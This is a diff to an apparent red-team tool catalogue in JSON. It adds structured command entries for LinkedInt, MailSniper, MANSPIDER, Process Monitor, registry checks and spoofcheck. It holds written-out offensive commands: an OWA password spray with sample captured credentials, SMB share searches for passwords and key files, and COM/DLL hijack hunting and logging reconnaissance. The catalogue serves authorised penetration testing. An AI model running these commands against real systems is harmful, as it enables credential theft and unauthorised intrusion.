+                "id": "f570a99e-7685-4e71-9287-d7af8adfb4ea",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "git clone https://github.com/vysecurity/LinkedInt\ncd LinkedInt\npip install -r requirements.txt\n\n1. Put in LinkedIn credentials in LinkedInt.cfg\n2. Put Hunter.io API key in LinkedInt.cfg"
+            },
+            {
+                "id": "02da6bcd-848b-484c-b4cf-c4dc1ac948fb",
+                "name": "Fetch people interactively",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "LinkedInt.py"
+            }
+        ]
     },
     {
         "name": "LyncSniper",
         "phases": [
             "02. Reconnaissance"
         ],
-        "category": "",
+        "category": "OSINT",
         "stealthy": false,
         "platforms": [
             "Python"
@@ -978,7 +1339,18 @@
         "undetected": [],
         "detected": [],
         "content": "\n## [[Exposed Machines]]\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "79bfc7a5-811d-4d7c-a097-b5ec220bd1a0",
+                "name": "Spider or repeater to find all links in website.",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "INTEL:WEB:LINKS"
+                ],
+                "cmd": "python3 LinkSniper.py https://www.google.com\n"
+            }
+        ]
     },
     {
         "name": "MailSniper",
@@ -995,8 +1367,30 @@
         "description": "MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an Exchange administrator to search the mailboxes of every user in a domain.",
         "undetected": [],
         "detected": [],
-        "content": "\n## [[Internal Phishing]] [[Phishing]]\nGet internal domain names\n``````\nipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: EDU or evil.corp\n``````\n\n Password spray\n``````\nInvoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022\n\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:EDU\\patrick Password:Summer2022\n[*] A total of 1 credentials were obtained.\n``````\n\n\n",
-        "commands": []
+        "content": "\n## [[Internal Phishing]] [[Phishing]]\nGet internal domain names\n''''''\nipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: EDU or evil.corp\n''''''\n\n Password spray\n''''''\nInvoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022\n\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:EDU\\patrick Password:Summer2022\n[*] A total of 1 credentials were obtained.\n''''''\n\n\n",
+        "commands": [
+            {
+                "id": "77b80a4a-d8e9-48aa-b9d1-f201bd7c68ae",
+                "name": "Get internal domain names",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "ipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100"
+            },
+            {
+                "id": "90f47a63-a165-4864-a3b1-5ef66ff184ef",
+                "name": "Password Spray",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022",
+                "requirements": {
+                    "tag": "SERVICE:OWA"
+                }
+            }
+        ]
     },
     {
         "name": "MANSPIDER",
@@ -1012,8 +1406,47 @@
         "description": "Spider entire networks for juicy files sitting on SMB shares. Search filenames or file content - regex supported!",
         "undetected": [],
         "detected": [],
-        "content": "## Installation\n```sh\n(Optional) Install these dependencies to add additional file parsing capability:\n# for images (png, jpeg)\n$ sudo apt install tesseract-ocr\n\n# for legacy document support (.doc)\n$ sudo apt install antiword\nInstall manspider (please be patient, this can take a while):\n\n$ pip install pipx\n$ pipx install git+https://github.com/blacklanternsecurity/MANSPIDER\n```\n\n## [[Credentials]]\nSearch the network for filenames that may contain creds\n>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password\n\nSearch for XLSX files containing \"password\"\n>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password\n\nSearch for interesting file extensions\n> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password\n\n",
-        "commands": []
+        "content": "## Installation\n'''sh\n(Optional) Install these dependencies to add additional file parsing capability:\n# for images (png, jpeg)\n$ sudo apt install tesseract-ocr\n\n# for legacy document support (.doc)\n$ sudo apt install antiword\nInstall manspider (please be patient, this can take a while):\n\n$ pip install pipx\n$ pipx install git+https://github.com/blacklanternsecurity/MANSPIDER\n'''\n\n## [[Credentials]]\nSearch the network for filenames that may contain creds\n>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password\n\nSearch for XLSX files containing \"password\"\n>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password\n\nSearch for interesting file extensions\n> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password\n\n",
+        "commands": [
+            {
+                "id": "e15907bc-e26c-4462-b8c5-ed5a740917eb",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "sudo apt install tesseract-ocr\nsudo apt install antiword\npip install pipx\npipx install git+https://github.com/blacklanternsecurity/MANSPIDER"
+            },
+            {
+                "id": "a562be37-6d72-4372-adbc-b78eee0a91a4",
+                "name": "Search the network for filenames that may contain creds",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password"
+            },
+            {
+                "id": "6027516d-5e31-4074-9042-a44723327416",
+                "name": "Search for XLSX files containing \"password\"",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password"
+            },
+            {
+                "id": "6b5dc298-ee54-4b8f-be54-7843b7ff873c",
+                "name": "Search for interesting file extensions",
+                "description": "",
+                "tag": "",
+                "results": [
+                    "CRED:PASS:PLAIN"
+                ],
+                "cmd": "manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password"
+            }
+        ]
     },
     {
         "name": "MASSCAN",
@@ -1779,7 +2212,24 @@
         "undetected": [],
         "detected": [],
         "content": "# Process Monitor\n\n## [[COM Hijacking]]\nFind COM hijacks\n[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.\n\nDue to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:\n\n-   **RegOpenKey** operations.\n-   where the _Result_ is **NAME NOT FOUND**.\n-   and the _Path_ ends with **InprocServer32**.\n ![](/Images/Hunting-com.png)\n\nVerify that the entry does exist in HKLM, but not in HKCU.\n>Get-Item -Path \"HKLM:\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\"\n\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "97d6f0d7-8443-41d6-864f-81a8fa73d87c",
+                "name": "Filter for DLL Hijacking CLSID",
+                "description": "Filter + verify that the entry does exist in HKLM, but not in HKCU",
+                "tag": "",
+                "results": [],
+                "cmd": "Operations = RegOpenKey\nResult = NAME NOT FOUND\nPath ENDSWITH InprocServer32\n\nGet-Item -Path \"HKLM:\\Software\\Classes\\CLSID{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\""
+            },
+            {
+                "id": "e0a00380-bfe4-47de-aae5-b911ea654ee2",
+                "name": "Filter for DLL Search-Order-Hijacking",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Path ENDSWITH .dll\nResult = NAME NOT FOUND\nProcess Name CONTAINS <processname>"
+            }
+        ]
     },
     {
         "name": "Prowl",
@@ -1897,8 +2347,33 @@
         "description": "Registry query stuff",
         "undetected": [],
         "detected": [],
-        "content": "\n## [[PowerShell Logging]]\n#get_powershell_logging\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n```\n\n## [[PowerShell-Version]]\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion\n```\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShellCore\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"",
-        "commands": []
+        "content": "\n## [[PowerShell Logging]]\n#get_powershell_logging\n'''ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n'''\n\n## [[PowerShell-Version]]\n'''ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion\n'''\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShellCore\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n\"EnableTranscripting\"=dword:00000001\n\"OutputDirectory\"=\"c:\\windows\\temp\\pstranscripts\"",
+        "commands": [
+            {
+                "id": "f74abf51-9446-4701-a3ab-7077a6602a88",
+                "name": "PowerShell Logging",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
+            },
+            {
+                "id": "a59f2da6-d883-4cb3-ad3e-65085418256e",
+                "name": "PowerShell Versions",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion"
+            },
+            {
+                "id": "28ffd6e0-476f-450c-a4cb-196f247d22d7",
+                "name": "SafeDllSearchMode",
+                "description": "If enabled, DLLs found in SYSTEM32 will be loaded instead of the local directory",
+                "tag": "",
+                "results": [],
+                "cmd": "reg query HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode"
+            }
+        ]
     },
     {
         "name": "Remote Server Administration Tools (RSAT)",
@@ -2358,15 +2833,34 @@
             "01. Initial Access",
             "08. Credentials & User Impersonation"
         ],
-        "category": "",
+        "category": "OSINT",
         "stealthy": false,
-        "platforms": [],
+        "platforms": [
+            "Python"
+        ],
         "source": "https://github.com/BishopFox/spoofcheck",
         "description": "Simple script that checks a domain for email protections",
         "undetected": [],
         "detected": [],
         "content": "\n## [[Internal Phishing]][[Phishing]]\nSimple script that checks a domain for email protections.\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "b0c14789-9e82-4c39-9975-da3eafe934ca",
+                "name": "Check SPF and DMARC records",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "./spoofcheck.py [DOMAIN]"
+            },
+            {
+                "id": "5e49afdc-8e7d-4ffe-b112-584176053a63",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "git clone https://github.com/BishopFox/spoofcheck.git\npip install -r requirements.txt"
+            }
+        ]
     },
     {
         "name": "SpoolSample",
